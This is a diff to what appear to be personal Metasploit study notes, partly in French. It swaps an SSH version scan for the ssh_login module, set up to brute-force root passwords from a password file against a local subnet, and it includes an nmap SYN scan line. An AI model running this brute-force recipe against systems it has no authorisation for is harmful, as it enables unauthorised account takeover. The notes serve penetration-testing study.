@@ -40,15 +40,15 @@ platforms:</opt/metasploit-framework/embedded/framework/modules/exploits>
 #msf5 nmap -sS 192.168.1.x
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-1.[SSH]:
+1.[SSH]:22
 #msf5 search ssh_version
-#msf5 use auxiliary/scanner/ssh/ssh_version
-#msf5 auxiliary(scanner/ssh/ssh_version) > options
-#msf5 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.18
-#msf5 auxiliary(scanner/ssh/ssh_version) > set THREADS 100
-#msf5 auxiliary(scanner/ssh/ssh_version) > run
-#msf5 auxiliary(scanner/ssh/ssh_version) > set THREADS 100
-
+#msf5 use auxiliary/scanner/ssh/ssh_login
+#msf5 set RHOSTS 192.168.1.x
+#msf5 set PASS_FILE passwords.txt
+#msf5 set USERNAME root
+#msf5 set VERBOSE true
+#msf5 services -p 22 -u -R
+#msf5 run
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 CVE: Common Vulnerabilities and Exposures
 	+ un dictionaire des informations publiques relatives aux vulnérabilités de sécurité.
